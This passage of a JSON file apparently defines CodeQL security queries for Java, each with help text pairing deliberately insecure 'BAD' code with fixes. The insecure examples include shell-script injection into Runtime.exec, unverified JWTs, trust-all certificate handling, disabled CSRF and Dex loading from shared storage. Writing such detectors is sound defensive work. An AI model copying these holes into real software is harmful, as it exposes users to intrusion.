    "language": "java",
    "help": "# Lock order inconsistency\nAcquiring two locks in an inconsistent order may result in deadlock if two threads simultaneously attempt to acquire the locks, and each thread succeeds in acquiring one lock prior to being able to acquire the other lock.\n\n\n## Recommendation\nTo guard against deadlock, use one of the following alternatives:\n\n* Define an ordering on locks, and ensure that clients respect that ordering when acquiring locks.\n* Simplify the code to only use a single lock, where possible.\n* Use `ReentrantLock`s and acquire locks using `tryLock()` instead of `lock()`.\n\n## Example\nIn the following example, one method acquires `primaryLock` followed by `savingsLock`, and another method acquires these locks in reverse order. This may result in deadlock if the two methods are invoked by two threads simultaneously, and each thread acquires one of the two locks prior to being able to acquire the other one.\n\n\n```java\nclass Test {\n\tprivate int primaryAccountBalance;\n\tprivate Object primaryLock = new Object();\n\tprivate int savingsAccountBalance;\n\tprivate Object savingsLock = new Object();\n\n\tpublic boolean transferToSavings(int amount) {\n\t\tsynchronized(primaryLock) {\n\t\t\tsynchronized(savingsLock) {\n\t\t\t\tif (amount>0 && primaryAccountBalance>=amount) {\n\t\t\t\t\tprimaryAccountBalance -= amount;\n\t\t\t\t\tsavingsAccountBalance += amount;\n\t\t\t\t\treturn true;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\treturn false;\n\t}\n\tpublic boolean transferToPrimary(int amount) {\n\t\t// AVOID: lock order is different from \"transferToSavings\"\n\t\t// and may result in deadlock\n\t\tsynchronized(savingsLock) {\n\t\t\tsynchronized(primaryLock) {\n\t\t\t\tif (amount>0 && savingsAccountBalance>=amount) {\n\t\t\t\t\tsavingsAccountBalance -= amount;\n\t\t\t\t\tprimaryAccountBalance += amount;\n\t\t\t\t\treturn true;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\treturn false;\n\t}\n}\n\n```\nOne way to address the issue in the above example is to reverse the lock order in `transferToPrimary` to match the lock order in `transferToSecondary`.\n\n\n## References\n* SEI CERT Oracle Coding Standard for Java: [LCK07-J. Avoid deadlock by requesting and releasing locks in the same order](https://wiki.sei.cmu.edu/confluence/display/java/LCK07-J.+Avoid+deadlock+by+requesting+and+releasing+locks+in+the+same+order).\n* Java Language Specification: [Synchronization](https://docs.oracle.com/javase/specs/jls/se11/html/jls-17.html#jls-17.1).\n* Java API Specification: [ReentrantLock](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/util/concurrent/locks/ReentrantLock.html).\n* Common Weakness Enumeration: [CWE-833](https://cwe.mitre.org/data/definitions/833.html).\n"
  },
  "java/local-thread-resource-abuse": {
    "name": "Uncontrolled thread resource consumption from local input source",
    "description": "Using user input directly to control a thread's sleep time could lead to performance problems or even resource exhaustion.",
    "kind": "path-problem",
    "id": "java/local-thread-resource-abuse",
    "problem.severity": "recommendation",
    "tags": [
      "security",
      "external/cwe/cwe-400"
    ],
    "filename": "708900a6-LocalThreadResourceAbuse",
    "language": "java",
    "help": "# Uncontrolled thread resource consumption from local input source\nThe `Thread.sleep` method is used to pause the execution of current thread for specified time. When the sleep time is user-controlled, especially in the web application context, it can be abused to cause all of a server's threads to sleep, leading to denial of service.\n\n\n## Recommendation\nTo guard against this attack, consider specifying an upper range of allowed sleep time or adopting the producer/consumer design pattern with `Object.wait` method to avoid performance problems or even resource exhaustion. For more information, refer to the concurrency tutorial of Oracle listed below or `java/ql/src/Likely Bugs/Concurrency` queries of CodeQL.\n\n\n## Example\nThe following example shows a bad situation and a good situation respectively. In the bad situation, a thread sleep time comes directly from user input. In the good situation, an upper range check on the maximum sleep time allowed is enforced.\n\n\n```java\nclass SleepTest {\n\tpublic void test(int userSuppliedWaitTime) throws Exception {\n\t\t// BAD: no boundary check on wait time\n\t\tThread.sleep(userSuppliedWaitTime);\n\n\t\t// GOOD: enforce an upper limit on wait time\n\t\tif (userSuppliedWaitTime > 0 && userSuppliedWaitTime < 5000) {\n\t\t\tThread.sleep(userSuppliedWaitTime);\n\t\t}\n\t}\n}\n\n```\n\n## References\n* Snyk: [Denial of Service (DoS) in com.googlecode.gwtupload:gwtupload](https://snyk.io/vuln/SNYK-JAVA-COMGOOGLECODEGWTUPLOAD-569506).\n* gwtupload: [\\[Fix DOS issue\\] Updating the AbstractUploadListener.java file](https://github.com/manolo/gwtupload/issues/33).\n* The blog of a gypsy engineer: [ CVE-2019-17555: DoS via Retry-After header in Apache Olingo](https://blog.gypsyengineer.com/en/security/cve-2019-17555-dos-via-retry-after-header-in-apache-olingo.html).\n* Oracle: [The Java Concurrency Tutorials](https://docs.oracle.com/javase/tutorial/essential/concurrency/guardmeth.html)\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n"
  },
  "java/command-line-injection-extra-local": {
    "name": "Command Injection into Runtime.exec() with dangerous command",
    "description": "High sensitvity and precision version of java/command-line-injection, designed to find more cases of command injection in rare cases that the default query does not find",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 6.1,
    "precision": "high",
    "id": "java/command-line-injection-extra-local",
    "tags": [
      "security",
      "experimental",
      "local",
      "external/cwe/cwe-078"
    ],
    "filename": "f0ce0668-CommandInjectionRuntimeExecLocal",
    "language": "java",
    "help": "# Command Injection into Runtime.exec() with dangerous command\nCode that passes local user input to an arugment of a call of `Runtime.exec` that executes a scripting executable will allow the user to execute malicious code.\n\n\n## Recommendation\nIf possible, use hard-coded string literals to specify the command or script to run, or library to load. Instead of passing the user input directly to the process or library function, examine the user input and then choose among hard-coded string literals.\n\nIf the applicable libraries or commands cannot be determined at compile time, then add code to verify that the user input string is safe before using it.\n\n\n## Example\nThe following example shows code that takes a shell script that can be changed maliciously by a user, and passes it straight to the array going into `Runtime.exec` without examining it first.\n\n\n```java\nclass Test {\n    public static void main(String[] args) {\n        String script = System.getenv(\"SCRIPTNAME\");\n        if (script != null) {\n            // BAD: The script to be executed by /bin/sh is controlled by the user.\n            Runtime.getRuntime().exec(new String[]{\"/bin/sh\", script});\n        }\n    }\n}\n```\n\n## References\n* OWASP: [Command Injection](https://www.owasp.org/index.php/Command_Injection).\n* SEI CERT Oracle Coding Standard for Java: [IDS07-J. Sanitize untrusted data passed to the Runtime.exec() method](https://wiki.sei.cmu.edu/confluence/display/java/IDS07-J.+Sanitize+untrusted+data+passed+to+the+Runtime.exec()+method).\n* Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).\n"
  },
  "java/missing-jwt-signature-check-auth0": {
    "name": "Missing JWT signature check",
    "description": "Failing to check the Json Web Token (JWT) signature may allow an attacker to forge their own tokens.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.8,
    "precision": "high",
    "id": "java/missing-jwt-signature-check-auth0",
    "tags": [
      "security",
      "external/cwe/cwe-347"
    ],
    "filename": "f3dd0b92-Auth0NoVerifier",
    "language": "java",
    "help": "# Missing JWT signature check\nA JSON Web Token (JWT) is used for authenticating and managing users in an application. It must be verified in order to ensure the JWT is genuine.\n\n\n## Recommendation\nDon't use information from a JWT without verifying that JWT.\n\n\n## Example\nThe following example illustrates secure and insecure use of the Auth0 \\`java-jwt\\` library.\n\n\n```java\npackage com.example.JwtTest;\n\nimport java.io.*;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.Objects;\nimport java.util.Optional;\nimport javax.crypto.KeyGenerator;\nimport javax.servlet.http.*;\nimport javax.servlet.annotation.*;\nimport com.auth0.jwt.JWT;\nimport com.auth0.jwt.JWTVerifier;\nimport com.auth0.jwt.algorithms.Algorithm;\nimport com.auth0.jwt.exceptions.JWTCreationException;\nimport com.auth0.jwt.exceptions.JWTVerificationException;\nimport com.auth0.jwt.interfaces.DecodedJWT;\n\n@WebServlet(name = \"JwtTest1\", value = \"/Auth\")\npublic class auth0 extends HttpServlet {\n\n  public void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {\n    response.setContentType(\"text/html\");\n    PrintWriter out = response.getWriter();\n\n    // OK: first decode without signature verification\n    // and then verify with signature verification\n    String JwtToken1 = request.getParameter(\"JWT1\");\n    String userName =  decodeToken(JwtToken1);\n    verifyToken(JwtToken1, \"A Securely generated Key\");\n    if (Objects.equals(userName, \"Admin\")) {\n      out.println(\"<html><body>\");\n      out.println(\"<h1>\" + \"heyyy Admin\" + \"</h1>\");\n      out.println(\"</body></html>\");\n    }\n\n    out.println(\"<html><body>\");\n    out.println(\"<h1>\" + \"heyyy Nobody\" + \"</h1>\");\n    out.println(\"</body></html>\");\n  }\n\n  public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n    response.setContentType(\"text/html\");\n    PrintWriter out = response.getWriter();\n\n    // NOT OK:  only decode, no verification\n    String JwtToken2 = request.getParameter(\"JWT2\");\n    String userName = decodeToken(JwtToken2);\n    if (Objects.equals(userName, \"Admin\")) {\n      out.println(\"<html><body>\");\n      out.println(\"<h1>\" + \"heyyy Admin\" + \"</h1>\");\n      out.println(\"</body></html>\");\n    }\n\n    // OK:  no clue of the use of unsafe decoded JWT return value\n    JwtToken2 = request.getParameter(\"JWT2\");\n    JWT.decode(JwtToken2);\n\n\n    out.println(\"<html><body>\");\n    out.println(\"<h1>\" + \"heyyy Nobody\" + \"</h1>\");\n    out.println(\"</body></html>\");\n  }\n\n  public static boolean verifyToken(final String token, final String key) {\n    try {\n      JWTVerifier verifier = JWT.require(Algorithm.HMAC256(key)).build();\n      verifier.verify(token);\n      return true;\n    } catch (JWTVerificationException e) {\n      System.out.printf(\"jwt decode fail, token: %s\", e);\n    }\n    return false;\n  }\n\n\n  public static String decodeToken(final String token) {\n    DecodedJWT jwt = JWT.decode(token);\n    return Optional.of(jwt).map(item -> item.getClaim(\"userName\").asString()).orElse(\"\");\n  }\n\n}\n\n```\n\n## References\n* [The incorrect use of JWT in ShenyuAdminBootstrap allows an attacker to bypass authentication.](https://nvd.nist.gov/vuln/detail/CVE-2021-37580)\n* Common Weakness Enumeration: [CWE-347](https://cwe.mitre.org/data/definitions/347.html).\n"
  },
  "java/android-insecure-dex-loading": {
    "name": "Insecure loading of an Android Dex File",
    "description": "Loading a DEX library located in a world-writable location such as an SD card can lead to arbitrary code execution vulnerabilities.",
    "kind": "path-problem",
    "problem.severity": "error",
    "precision": "high",
    "id": "java/android-insecure-dex-loading",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-094"
    ],
    "filename": "dad3fd69-InsecureDexLoading",
    "language": "java",
    "help": "# Insecure loading of an Android Dex File\nIt is dangerous to load Dex libraries from shared world-writable storage spaces. A malicious actor can replace a dex file with a maliciously crafted file which when loaded by the app can lead to code execution.\n\n\n## Recommendation\nLoading a file from private storage instead of a world-writable one can prevent this issue, because the attacker cannot access files stored there.\n\n\n## Example\nThe following example loads a Dex file from a shared world-writable location. in this case, since the \\`/sdcard\\` directory is on external storage, anyone can read/write to the location. bypassing all Android security policies. Hence, this is insecure.\n\n\n```java\n\nimport android.app.Application;\nimport android.content.Context;\nimport android.content.pm.PackageInfo;\nimport android.os.Bundle;\n\nimport dalvik.system.DexClassLoader;\nimport dalvik.system.DexFile;\n\npublic class InsecureDexLoading extends Application {\n\t@Override\n\tpublic void onCreate() {\n\t\tsuper.onCreate();\n\t\tupdateChecker();\n\t}\n\n\tprivate void updateChecker() {\n\t\ttry {\n\t\t\tFile file = new File(\"/sdcard/updater.apk\");\n\t\t\tif (file.exists() && file.isFile() && file.length() <= 1000) {\n\t\t\t\tDexClassLoader cl = new DexClassLoader(file.getAbsolutePath(), getCacheDir().getAbsolutePath(), null,\n\t\t\t\t\t\tgetClassLoader());\n\t\t\t\tint version = (int) cl.loadClass(\"my.package.class\").getDeclaredMethod(\"myMethod\").invoke(null);\n\t\t\t\tif (Build.VERSION.SDK_INT < version) {\n\t\t\t\t\tToast.makeText(this, \"Loaded Dex!\", Toast.LENGTH_LONG).show();\n\t\t\t\t}\n\t\t\t}\n\t\t} catch (Exception e) {\n\t\t\t// ignore\n\t\t}\n\t}\n}\n\n```\nThe next example loads a Dex file stored inside the app's private storage. This is not exploitable as nobody else except the app can access the data stored there.\n\n\n```java\npublic class SecureDexLoading extends Application {\n\t@Override\n\tpublic void onCreate() {\n\t\tsuper.onCreate();\n\t\tupdateChecker();\n\t}\n\n\tprivate void updateChecker() {\n\t\ttry {\n\t\t\tFile file = new File(getCacheDir() + \"/updater.apk\");\n\t\t\tif (file.exists() && file.isFile() && file.length() <= 1000) {\n\t\t\t\tDexClassLoader cl = new DexClassLoader(file.getAbsolutePath(), getCacheDir().getAbsolutePath(), null,\n\t\t\t\t\t\tgetClassLoader());\n\t\t\t\tint version = (int) cl.loadClass(\"my.package.class\").getDeclaredMethod(\"myMethod\").invoke(null);\n\t\t\t\tif (Build.VERSION.SDK_INT < version) {\n\t\t\t\t\tToast.makeText(this, \"Securely loaded Dex!\", Toast.LENGTH_LONG).show();\n\t\t\t\t}\n\t\t\t}\n\t\t} catch (Exception e) {\n\t\t\t// ignore\n\t\t}\n\t}\n}\n```\n\n## References\n* Android Documentation: [Data and file storage overview](https://developer.android.com/training/data-storage/).\n* Android Documentation: [DexClassLoader](https://developer.android.com/reference/dalvik/system/DexClassLoader).\n* Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).\n"
  },
  "java/non-ssl-connection": {
    "name": "Failure to use SSL",
    "description": "Non-SSL connections can be intercepted by third parties.",
    "kind": "problem",
    "problem.severity": "recommendation",
    "security-severity": 7.5,
    "precision": "medium",
    "id": "java/non-ssl-connection",
    "tags": [
      "security",
      "external/cwe/cwe-319"
    ],
    "filename": "8b24eede-UseSSL",
    "language": "java",
    "help": "# Failure to use SSL\nUsing a stream that is derived from a non-SSL connection or socket can result in an unsecured connection that is vulnerable to interception.\n\n\n## Recommendation\nUse `javax.net.ssl.HttpsURLConnection` and `javax.net.ssl.SSLSocket` instead of the corresponding unsecured versions in `java.net`. If necessary, downcast from an `HttpURLConnection` to an `HttpsURLConnection` to enforce the use of SSL. In addition, when you construct a `java.net.URL`, ensure that you use the HTTPS protocol, to avoid exceptions when trying to make HTTPS connections to the URL.\n\n\n## Example\nThe following example shows two ways of opening an output stream. When the stream is opened using `httpcon`, which is an `HttpURLConnection`, the connection does not use SSL, and therefore is vulnerable to attack. When the stream is opened using `httpscon`, the connection is a secured SSL connection.\n\n\n```java\npublic static void main(String[] args) {\n\t{\n\t\ttry {\n\t\t\tURL u = new URL(\"http://www.secret.example.org/\");\n\t\t\tHttpURLConnection httpcon = (HttpURLConnection) u.openConnection();\n\t\t\thttpcon.setRequestMethod(\"PUT\");\n\t\t\thttpcon.connect();\n\t\t\t// BAD: output stream from non-HTTPS connection\n\t\t\tOutputStream os = httpcon.getOutputStream();\n\t\t\thttpcon.disconnect();\n\t\t}\n\t\tcatch (IOException e) {\n\t\t\t// fail\n\t\t}\n\t}\n\t\n\t{\n\t\ttry {\n\t\t\tURL u = new URL(\"https://www.secret.example.org/\");\n\t\t\tHttpsURLConnection httpscon = (HttpsURLConnection) u.openConnection();\n\t\t\thttpscon.setRequestMethod(\"PUT\");\n\t\t\thttpscon.connect();\n\t\t\t// GOOD: output stream from HTTPS connection\n\t\t\tOutputStream os = httpscon.getOutputStream();\n\t\t\thttpscon.disconnect();\n\t\t}\n\t\tcatch (IOException e) {\n\t\t\t// fail\n\t\t}\n\t}\n}\n```\n\n## References\n* SEI CERT Oracle Coding Standard for Java: [SER03-J. Do not serialize unencrypted, sensitive data](https://wiki.sei.cmu.edu/confluence/display/java/SER03-J.+Do+not+serialize+unencrypted+sensitive+data).\n* Java API Specification: [ Class HttpsURLConnection](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/javax/net/ssl/HttpsURLConnection.html).\n* Java API Specification: [ Class SSLSocket](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/javax/net/ssl/SSLSocket.html).\n* OWASP: [Transport Layer Protection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html).\n* Common Weakness Enumeration: [CWE-319](https://cwe.mitre.org/data/definitions/319.html).\n"
  },
  "java/spring-disabled-csrf-protection": {
    "name": "Disabled Spring CSRF protection",
    "description": "Disabling CSRF protection makes the application vulnerable to a Cross-Site Request Forgery (CSRF) attack.",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 8.8,
    "precision": "high",
    "id": "java/spring-disabled-csrf-protection",
    "tags": [
      "security",
      "external/cwe/cwe-352"
    ],
    "filename": "719a2bf8-SpringCSRFProtection",
    "language": "java",
    "help": "# Disabled Spring CSRF protection\nWhen you set up a web server to receive a request from a client without any mechanism for verifying that it was intentionally sent, then it is vulnerable to attack. An attacker can trick a client into making an unintended request to the web server that will be treated as an authentic request. This can be done via a URL, image load, XMLHttpRequest, etc. and can result in exposure of data or unintended code execution.\n\n\n## Recommendation\nWhen you use Spring, Cross-Site Request Forgery (CSRF) protection is enabled by default. Spring's recommendation is to use CSRF protection for any request that could be processed by a browser client by normal users.\n\n\n## Example\nThe following example shows the Spring Java configuration with CSRF protection disabled. This type of configuration should only be used if you are creating a service that is used only by non-browser clients.\n\n\n```java\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.security.config.annotation.web.builders.HttpSecurity;\nimport org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;\nimport org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;\n\n@EnableWebSecurity\n@Configuration\npublic class WebSecurityConfig extends WebSecurityConfigurerAdapter {\n  @Override\n  protected void configure(HttpSecurity http) throws Exception {\n    http\n      .csrf(csrf ->\n        // BAD - CSRF protection shouldn't be disabled\n        csrf.disable() \n      );\n  }\n}\n\n```\n\n## References\n* OWASP: [Cross-Site Request Forgery (CSRF)](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)).\n* Spring Security Reference: [ Cross Site Request Forgery (CSRF) for Servlet Environments ](https://docs.spring.io/spring-security/site/docs/current/reference/html5/#servlet-csrf).\n* Common Weakness Enumeration: [CWE-352](https://cwe.mitre.org/data/definitions/352.html).\n"
  },
  "java/improper-webview-certificate-validation": {
    "name": "Android `WebView` that accepts all certificates",
    "description": "Trusting all certificates allows an attacker to perform a machine-in-the-middle attack.",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
    "id": "java/improper-webview-certificate-validation",
    "tags": [
      "security",
      "external/cwe/cwe-295"
    ],
    "filename": "865b12b5-ImproperWebViewCertificateValidation",
    "language": "java",
    "help": "# Android `WebView` that accepts all certificates\nIf the `onReceivedSslError` method of an Android `WebViewClient` always calls `proceed` on the given `SslErrorHandler`, it trusts any certificate. This allows an attacker to perform a machine-in-the-middle attack against the application, therefore breaking any security Transport Layer Security (TLS) gives.\n\nAn attack might look like this:\n\n1. The vulnerable application connects to `https://example.com`.\n1. The attacker intercepts this connection and presents a valid, self-signed certificate for `https://example.com`.\n1. The vulnerable application calls the `onReceivedSslError` method to check whether it should trust the certificate.\n1. The `onReceivedSslError` method of your `WebViewClient` calls `SslErrorHandler.proceed`.\n1. The vulnerable application accepts the certificate and proceeds with the connection since your `WevViewClient` trusted it by proceeding.\n1. The attacker can now read the data your application sends to `https://example.com` and/or alter its replies while the application thinks the connection is secure.\n\n## Recommendation\nDo not use a call `SslerrorHandler.proceed` unconditionally. If you have to use a self-signed certificate, only accept that certificate, not all certificates.\n\n\n## Example\nIn the first (bad) example, the `WebViewClient` trusts all certificates by always calling `SslErrorHandler.proceed`. In the second (good) example, only certificates signed by a certain public key are accepted.\n\n\n```java\nclass Bad extends WebViewClient {\n    // BAD: All certificates are trusted.\n    public void onReceivedSslError (WebView view, SslErrorHandler handler, SslError error) { // $hasResult\n        handler.proceed(); \n    }\n}\n\nclass Good extends WebViewClient {\n    PublicKey myPubKey = ...;\n\n    // GOOD: Only certificates signed by a certain public key are trusted.\n    public void onReceivedSslError (WebView view, SslErrorHandler handler, SslError error) { // $hasResult\n        try {\n            X509Certificate cert = error.getCertificate().getX509Certificate();\n            cert.verify(this.myPubKey);\n            handler.proceed();\n        }\n        catch (CertificateException|NoSuchAlgorithmException|InvalidKeyException|NoSuchProviderException|SignatureException e) {\n            handler.cancel();\n        }\n    }    \n}\n```\n\n## References\n* [WebViewClient.onReceivedSslError documentation](https://developer.android.com/reference/android/webkit/WebViewClient?hl=en#onReceivedSslError(android.webkit.WebView,%20android.webkit.SslErrorHandler,%20android.net.http.SslError)).\n* Common Weakness Enumeration: [CWE-295](https://cwe.mitre.org/data/definitions/295.html).\n"
  },
  "java/android/intent-redirection": {
    "name": "Android Intent redirection",
    "description": "Starting Android components with user-provided Intents can provide access to internal components of the application, increasing the attack surface and potentially causing unintended effects.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
    "id": "java/android/intent-redirection",
    "tags": [
      "security",
      "external/cwe/cwe-926",
      "external/cwe/cwe-940"
    ],
    "filename": "b2048181-AndroidIntentRedirection",
    "language": "java",
    "help": "# Android Intent redirection\nAn exported Android component that obtains a user-provided Intent and uses it to launch another component can be exploited to obtain access to private, unexported components of the same app or to launch other apps' components on behalf of the victim app.\n\n\n## Recommendation\nDo not export components that start other components from a user-provided Intent. They can be made private by setting the `android:exported` property to `false` in the app's Android Manifest.\n\nIf this is not possible, restrict either which apps can send Intents to the affected component, or which components can be started from it.\n\n\n## Example\nThe following snippet contains three examples. In the first example, an arbitrary component can be started from the externally provided `forward_intent` Intent. In the second example, the destination component of the Intent is first checked to make sure it is safe. In the third example, the component that created the Intent is first checked to make sure it comes from a trusted origin.\n\n\n```java\n// BAD: A user-provided Intent is used to launch an arbitrary component\nIntent forwardIntent = (Intent) getIntent().getParcelableExtra(\"forward_intent\");\nstartActivity(forwardIntent);\n\n// GOOD: The destination component is checked before launching it\nIntent forwardIntent = (Intent) getIntent().getParcelableExtra(\"forward_intent\");\nComponentName destinationComponent = forwardIntent.resolveActivity(getPackageManager());\nif (destinationComponent.getPackageName().equals(\"safe.package\") && \n    destinationComponent.getClassName().equals(\"SafeClass\")) {\n    startActivity(forwardIntent);\n}\n\n// GOOD: The component that sent the Intent is checked before launching the destination component\nIntent forwardIntent = (Intent) getIntent().getParcelableExtra(\"forward_intent\");\nComponentName originComponent = getCallingActivity();\nif (originComponent.getPackageName().equals(\"trusted.package\") && originComponent.getClassName().equals(\"TrustedClass\")) {\n    startActivity(forwardIntent);\n}\n\n```\n\n## References\n* Google: [Remediation for Intent Redirection Vulnerability](https://support.google.com/faqs/answer/9267555?hl=en).\n* OWASP Mobile Security Testing Guide: [Intents](https://mobile-security.gitbook.io/mobile-security-testing-guide/android-testing-guide/0x05a-platform-overview#intents).\n* Android Developers: [The android:exported attribute](https://developer.android.com/guide/topics/manifest/activity-element#exported).\n* Common Weakness Enumeration: [CWE-926](https://cwe.mitre.org/data/definitions/926.html).\n* Common Weakness Enumeration: [CWE-940](https://cwe.mitre.org/data/definitions/940.html).\n"
  },
  "java/android/backup-enabled": {
    "name": "Application backup allowed",
    "description": "Allowing application backups may allow an attacker to extract sensitive data.",
    "kind": "problem",
    "problem.severity": "recommendation",
    "security-severity": 7.5,
    "id": "java/android/backup-enabled",
    "tags": [
      "security",
      "external/cwe/cwe-312"
    ],
    "precision": "very-high",
    "filename": "c3bb55c3-AllowBackupAttributeEnabled",
    "language": "java",
    "help": "# Application backup allowed\nIn the Android manifest file, you can use the `android:allowBackup` attribute of the `application` element to define whether the application will have automatic backups or not.\n\nIf your application uses any sensitive data, you should disable automatic backups to prevent attackers from extracting it.\n\n\n## Recommendation\nFor Android applications which process sensitive data, set `android:allowBackup` to `false` in the manifest file.\n\nNote: Since Android 6.0 (Marshmallow), automatic backups for applications are switched on by default.\n\n\n## Example\nIn the following two (bad) examples, the `android:allowBackup` setting is enabled:\n\n\n```xml\n<manifest ... >\n    <!-- BAD: 'android:allowBackup' set to 'true' -->\n    <application\n        android:allowBackup=\"true\">\n        <activity ... >\n        </activity>\n    </application>\n</manifest>\n\n```\n\n```xml\n<manifest ... >\n    <!-- BAD: no 'android:allowBackup' set, defaults to 'true' -->\n    <application>\n        <activity ... >\n        </activity>\n    </application>\n</manifest>\n\n```\nIn the following (good) example, `android:allowBackup` is set to `false`:\n\n\n```xml\n<manifest ... >\n    <!-- GOOD: 'android:allowBackup' set to 'false' -->\n    <application\n        android:allowBackup=\"false\">\n        <activity ... >\n        </activity>\n    </application>\n</manifest>\n\n```\n\n## References\n* Android Documentation: [Back up user data with Auto Backup](https://developer.android.com/guide/topics/data/autobackup#EnablingAutoBackup)\n* OWASP Mobile Security Testing Guide: [ Android Backups ](https://github.com/OWASP/owasp-mstg/blob/b7a93a2e5e0557cc9a12e55fc3f6675f6986bb86/Document/0x05d-Testing-Data-Storage.md#backups)\n* Common Weakness Enumeration: [CWE-312](https://cwe.mitre.org/data/definitions/312.html).\n"
  },
  "java/uncontrolled-file-decompression": {
    "name": "Uncontrolled file decompression",
    "description": "Decompressing user-controlled files without checking the compression ratio may allow attackers to perform denial-of-service attacks.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.8,
    "precision": "high",
    "id": "java/uncontrolled-file-decompression",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-409"
    ],
    "filename": "de35cbf6-DecompressionBomb",
    "language": "java",
    "help": "# Uncontrolled file decompression\nExtracting Compressed files with any compression algorithm like gzip can cause a denial of service attack.\n\nAttackers can create a huge file by just repeating a single byte and compress it to a small file.\n\n\n## Recommendation\nWhen decompressing a user-provided compressed file, verify the decompression ratio or decompress the files within a loop byte by byte to be able to manage the decompressed size in each cycle of the loop.\n\n\n## Example\nIn the following example, the decompressed file size is not checked before decompression, exposing the application to a denial of service.\n\n\n```java\npackage org.example;\n\nimport java.nio.file.StandardCopyOption;\nimport java.util.Enumeration;\nimport java.io.IOException;\nimport java.util.zip.*;\nimport java.util.zip.ZipEntry;\nimport java.io.File;\nimport java.nio.file.Files;\n\n\nclass BadExample {\n    public static void ZipInputStreamUnSafe(String filename) throws IOException {\n        File f = new File(filename);\n        try (ZipFile zipFile = new ZipFile(f)) {\n            Enumeration<? extends ZipEntry> entries = zipFile.entries();\n\n            while (entries.hasMoreElements()) {\n                ZipEntry ze = entries.nextElement();\n                File out = new File(\"./tmp/tmp.txt\");\n                Files.copy(zipFile.getInputStream(ze), out.toPath(), StandardCopyOption.REPLACE_EXISTING);\n            }\n        }\n    }\n}\n```\nA better approach is shown in the following example, where a ZIP file is read within a loop and a size threshold is checked every cycle.\n\n\n```java\nimport java.util.zip.*;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.util.zip.ZipEntry;\n\npublic class GoodExample {\n    public static void ZipInputStreamSafe(String filename) throws IOException {\n        int UncompressedSizeThreshold = 10 * 1024 * 1024; // 10MB\n        int BUFFERSIZE = 256;\n        FileInputStream fis = new FileInputStream(filename);\n        try (ZipInputStream zis = new ZipInputStream(new BufferedInputStream(fis))) {\n            ZipEntry entry;\n            while ((entry = zis.getNextEntry()) != null) {\n                int count;\n                byte[] data = new byte[BUFFERSIZE];\n                FileOutputStream fos = new FileOutputStream(entry.getName());\n                BufferedOutputStream dest = new BufferedOutputStream(fos, BUFFERSIZE);\n                int totalRead = 0;\n                while ((count = zis.read(data, 0, BUFFERSIZE)) != -1) {\n                    totalRead = totalRead + count;\n                    if (totalRead > UncompressedSizeThreshold) {\n                        System.out.println(\"This Compressed file can be a bomb!\");\n                        break;\n                    }\n                    dest.write(data, 0, count);\n                }\n                dest.flush();\n                dest.close();\n                zis.closeEntry();\n            }\n        }\n    }\n}\n```\n\n## References\n* [CVE-2022-4565](https://github.com/advisories/GHSA-47vx-fqr5-j2gw)\n* David Fifield: [A better zip bomb](https://www.bamsoftware.com/hacks/zipbomb/).\n* Common Weakness Enumeration: [CWE-409](https://cwe.mitre.org/data/definitions/409.html).\n"
  },
  "java/uncaught-servlet-exception": {
    "name": "Uncaught Servlet Exception",
    "description": "Uncaught exceptions in a servlet could leave a system in an unexpected state, possibly resulting in denial-of-service attacks or the exposure of sensitive information disclosed in stack traces.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "precision": "medium",
    "id": "java/uncaught-servlet-exception",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-600"
    ],
    "filename": "dc9f5120-UncaughtServletException",
    "language": "java",
    "help": "# Uncaught Servlet Exception\nEven though the request-handling methods of `Servlet` are declared `throws IOException, ServletException`, it's a bad idea to let such exceptions be thrown. Failure to catch exceptions in a servlet could lead to exposure of sensitive information because when a servlet throws an exception, the servlet container typically sends debugging information back to the user. That information could be valuable to an attacker.\n\n\n## Recommendation\nCatch IOExceptions and/or RuntimeExceptions and display custom error messages without stack traces and sensitive information, or configure an `error-page` in web.xml to display a generic user-friendly message for any uncaught exception.\n\n\n## Example\nIn the first and second examples, subclasses of IOException and RuntimeException are not caught, which disclose stack traces. Because user-controlled data is passed to methods that throw, there is an opportunity for an attacker to provoke a stack dump.\n\nIn the third example, the code catches the exception. In the fourth example, the code is not of concern since the variable cannot be controlled by attackers thus no unexpected exceptions can be thrown.\n\n\n```java\nimport java.io.InputStream;\nimport java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.UnknownHostException;\n\nclass UncaughtServletException extends HttpServlet {\n    // BAD: Uncaught exceptions\n    {\n        public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {\n            String ip = request.getParameter(\"srcIP\");\n            InetAddress addr = InetAddress.getByName(ip); //BAD: getByName(String) throws UnknownHostException.\n\n            String username = request.getRemoteUser();\n            Integer.parseInt(username); //BAD: Integer.parse(String) throws RuntimeException.\n        }\n    }\n\n    // GOOD\n    {\n        public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {\n            try {\n                String ip = request.getParameter(\"srcIP\");\n                InetAddress addr = InetAddress.getByName(ip);\n            } catch 